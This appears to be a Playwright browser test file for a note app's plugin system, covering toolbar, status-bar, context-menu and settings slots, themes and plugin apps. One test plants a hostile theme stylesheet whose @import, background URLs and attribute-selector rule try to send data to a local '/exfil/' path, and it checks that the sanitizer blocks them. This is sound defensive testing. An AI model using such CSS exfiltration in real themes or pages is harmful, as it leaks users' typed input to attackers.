import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { expect, test, type Page } from "@playwright/test";
import { mockApi, shotPath } from "./mocks.ts";

// The three UI layers of plugins (themes, slots, whole-page apps) in a real browser, using the
// example plugins from plugins/examples. The server is mocked.

interface Served {
  manifest: Record<string, unknown>;
  hash: string;
  files: Record<string, string>;
}

const examples = fileURLToPath(new URL("../../plugins/examples/", import.meta.url));

function example(id: string, extraFiles: Record<string, string> = {}): Served {
  const read = (file: string) => readFileSync(`${examples}${id}/${file}`, "utf8");
  const manifest = JSON.parse(read("manifest.json")) as Record<string, unknown>;
  const files: Record<string, string> = { "main.js": read("main.js") };
  const contributes = manifest.contributes as { theme?: { css: string } };
  if (contributes.theme) files[contributes.theme.css] = read(contributes.theme.css);
  for (const path of Object.values((manifest.locales ?? {}) as Record<string, string>))
    files[path] = read(path);
  Object.assign(files, extraFiles);
  return { manifest, hash: id.length.toString(16).repeat(64).slice(0, 64), files };
}

async function serve(page: Page, plugins: Served[]) {
  await mockApi(page);
  await page.route("**/api/vaults/sample/plugin-runtime", (route) =>
    route.fulfill({
      json: {
        plugins: plugins.map((p) => ({
          id: p.manifest.id,
          version: p.manifest.version,
          hash: p.hash,
          manifest: p.manifest,
        })),
      },
    }),
  );
  await page.route("**/api/vaults/sample/plugin-runtime/*", (route) => {
    const id = decodeURIComponent(new URL(route.request().url()).pathname.split("/").pop()!);
    const found = plugins.find((p) => p.manifest.id === id);
    return found
      ? route.fulfill({ json: { id, hash: found.hash, files: found.files } })
      : route.fulfill({ status: 404, json: { code: "not_found", message: "no" } });
  });
}

test.use({ viewport: { width: 1280, height: 800 }, locale: "en", colorScheme: "dark" });

test.describe("slots", () => {
  test("every slot shows its entry and runs the plugin", async ({ page }) => {
    await serve(page, [example("slots-demo")]);
    await page.goto("/v/sample/Welcome.md");

    // Toolbar: the app draws the button (no icon given, so the title), the plugin does the work.
    await page.getByRole("button", { name: "Count notes" }).click();
    await expect(page.getByText("This vault has 2 notes.")).toBeVisible();

    // Status bar: shown because a file is open; the plugin got its path.
    const status = page.getByRole("contentinfo", { name: "Plugin status" });
    await status.getByRole("button", { name: "Where am I" }).click();
    await expect(page.getByText("Open file: Welcome.md")).toBeVisible();

    // Command palette.
    await page.keyboard.press("Control+Shift+P");
    await page.getByRole("combobox", { name: "Command palette" }).fill("Say hello");
    await page.keyboard.press("Enter");
    await expect(page.getByText("Hello from a plugin command.")).toBeVisible();

    // Context menu: offered on notes (the plugin's `visible` says so), not on other files.
    await page.getByRole("treeitem", { name: /Welcome\.md/ }).click({ button: "right" });
    await expect(page.getByRole("menuitem", { name: "Show size" })).toBeVisible();
    await page.getByRole("menuitem", { name: "Show size" }).click();
    await expect(page.getByText(/Welcome\.md is \d+ characters long/)).toBeVisible();
    await page.getByRole("treeitem", { name: /Tasks\.base/ }).click({ button: "right" });
    await expect(page.getByRole("menuitem", { name: "Rename" })).toBeVisible();
    await expect(page.getByRole("menuitem", { name: "Show size" })).toHaveCount(0);
    await page.keyboard.press("Escape");

    // Settings: the heading is the app's, the content is the plugin's, in a sandboxed frame.
    await page.getByRole("button", { name: "Settings" }).click();
    const section = page.getByRole("region", { name: "Slots demo" });
    await expect(section.locator("iframe")).toHaveAttribute("sandbox", "allow-scripts");
    await expect(
      section.frameLocator("iframe").getByText(/Every slot entry of this plugin/),
    ).toBeVisible();
    await page.screenshot({ path: shotPath("ui-layers-slots-settings") });
  });

  test("the status bar is absent when nothing is open for its entry", async ({ page }) => {
    await serve(page, [example("slots-demo")]);
    await page.goto("/v/sample");
    await expect(page.getByRole("button", { name: "Count notes" })).toBeVisible();
    await expect(page.getByRole("contentinfo", { name: "Plugin status" })).toHaveCount(0);
  });

  test("a plugin that may not read the open file does not learn its path", async ({ page }) => {
    const narrow = example("slots-demo");
    (narrow.manifest.permissions as { read: string[] }).read = ["Projects"];
    await serve(page, [narrow]);
    await page.goto("/v/sample/Welcome.md");
    await expect(page.getByRole("button", { name: "Count notes" })).toBeVisible();
    // Its status-bar entry needs a path to show, and it was not given one.
    await expect(page.getByRole("contentinfo", { name: "Plugin status" })).toHaveCount(0);
  });
});

test.describe("themes", () => {
  test("a chosen theme changes the app's variables and can be switched off", async ({ page }) => {
    await serve(page, [example("theme-midnight")]);
    await page.goto("/v/sample");
    const bg = () =>
      page.evaluate(() =>
        getComputedStyle(document.documentElement).getPropertyValue("--bg").trim(),
      );
    const before = await bg();
    expect(before).not.toBe("#0b1020");

    await page.getByRole("button", { name: "Settings" }).click();
    await page.getByRole("combobox", { name: "Plugin theme" }).selectOption("theme-midnight");
    await expect.poll(bg).toBe("#0b1020");
    await page.screenshot({ path: shotPath("ui-layers-theme-midnight") });

    // It survives a reload (kept on the device) and goes away when switched off.
    await page.reload();
    await expect.poll(bg).toBe("#0b1020");
    await page.getByRole("button", { name: "Settings" }).click();
    await page.getByRole("combobox", { name: "Plugin theme" }).selectOption("");
    await expect.poll(bg).toBe(before);
  });

  test("a hostile stylesheet cannot load anything or restyle the page", async ({ page }) => {
    const hits: string[] = [];
    await page.route("**/exfil/**", (route) => {
      hits.push(route.request().url());
      return route.fulfill({ status: 200, contentType: "text/css", body: "body{display:none}" });
    });
    const evil = example("theme-midnight", {
      "theme.css": `
        @import url("http://localhost:4173/exfil/import.css");
        :root { --accent: red; background-image: url("http://localhost:4173/exfil/bg.png"); }
        :root { --sneaky: url("http://localhost:4173/exfil/var.png"); }
        body, .main { display: none !important; }
        input[value^="a"] { background: url("http://localhost:4173/exfil/key.png"); }`,
    });
    await serve(page, [evil]);
    await page.goto("/v/sample");
    await page.getByRole("button", { name: "Settings" }).click();
    await page.getByRole("combobox", { name: "Plugin theme" }).selectOption("theme-midnight");
    await expect
      .poll(() =>
        page.evaluate(() =>
          getComputedStyle(document.documentElement).getPropertyValue("--accent").trim(),
        ),
      )
      .toBe("red");
    const injected = await page.evaluate(
      () => document.getElementById("palimvo-plugin-theme")?.textContent,
    );
    expect(injected).toBe(":root:root{--accent:red;}");
    expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe("none");
    await page.waitForTimeout(300);
    expect(hits, `requests that escaped: ${hits.join(", ")}`).toEqual([]);
  });
});

test.describe("apps", () => {
  test("an app takes over the main area and the app's navigation stays", async ({ page }) => {
    await serve(page, [example("hello-app")]);
    await page.goto("/v/sample");
    const nav = page.getByRole("navigation", { name: "Plugin apps" });
    await nav.getByRole("button", { name: "Hello app" }).click();
    const frame = page.frameLocator(".plugin-app iframe");
    await expect(frame.getByRole("heading", { name: "Hello from a plugin app" })).toBeVisible();
    await expect(frame.getByText("This vault has 4 files.")).toBeVisible();
    await expect(page.getByRole("navigation", { name: "Main navigation" })).toBeVisible();
    await expect(page.getByRole("button", { name: "Settings" })).toBeVisible();
    await expect(page).toHaveURL(/\?app=hello-app$/);
    await page.screenshot({ path: shotPath("ui-layers-app") });

    // The app can send the person to a file, which ends the takeover.
    await frame.getByRole("button", { name: "Open the first file" }).click();
    await expect(page).toHaveURL(/\/v\/sample\/Projects\/(Roadmap|Board)/);
    await expect(page.locator(".plugin-app")).toHaveCount(0);
  });
});
